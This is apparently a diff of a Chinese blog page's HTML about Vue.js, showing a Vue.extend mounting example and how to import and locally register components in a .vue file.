-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"mount-div"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="comment">//创建未挂载实例</span></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> MyComponent = Vue.extend(&#123;</span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></div><div class="line"><span class="javascript">        data: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></div><div class="line"><span class="javascript">                name: <span class="string">'Aresn'</span></span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="javascript">    <span class="comment">//挂载实例</span></span></div><div class="line"><span class="javascript">    newMyComponent().$mount(<span class="string">'#mount-div'</span>);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"mount-div"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">    //创建未挂载实例</span></div><div class="line"><span class="undefined">    var MyComponent = Vue.extend(&#123;</span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></div><div class="line"><span class="undefined">        data: function()&#123;</span></div><div class="line"><span class="undefined">            return &#123;</span></div><div class="line"><span class="undefined">                name: 'Aresn'</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined">    //挂载实例</span></div><div class="line"><span class="undefined">    newMyComponent().$mount('#mount-div');</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <h3 id="模块化中使用组件"><a href="#模块化中使用组件" class="headerlink" title="模块化中使用组件"></a>模块化中使用组件</h3><p>　　在模块化中使用其他组件，需要在局部注册之前导入每个你想使用的组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//ComponentB.vue</span></div><div class="line"><span class="keyword">import</span> ComponentA <span class="keyword">from</span> <span class="string">'./ComponentA'</span></div><div class="line"><span class="keyword">import</span> ComponentC <span class="keyword">from</span> <span class="string">'./ComponentC'</span></div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</div><div class="line">  components: &#123;</div><div class="line">    ComponentA,</div><div class="line">    ComponentC</div><div class="line">  &#125;,</div><div class="line">  <span class="comment">// ...</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>　　现在<code>ComponentA</code>和<code>ComponentC</code>都可以在<code>ComponentB</code>的模板中使用了。</p>
 <p>　　另外可以实现一些基础模块的全局化使用：<a href="https://cn.vuejs.org/v2/guide/components-registration.html#%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%85%A8%E5%B1%80%E6%B3%A8%E5%86%8C" target="_blank" rel="external">戳这里</a></p>
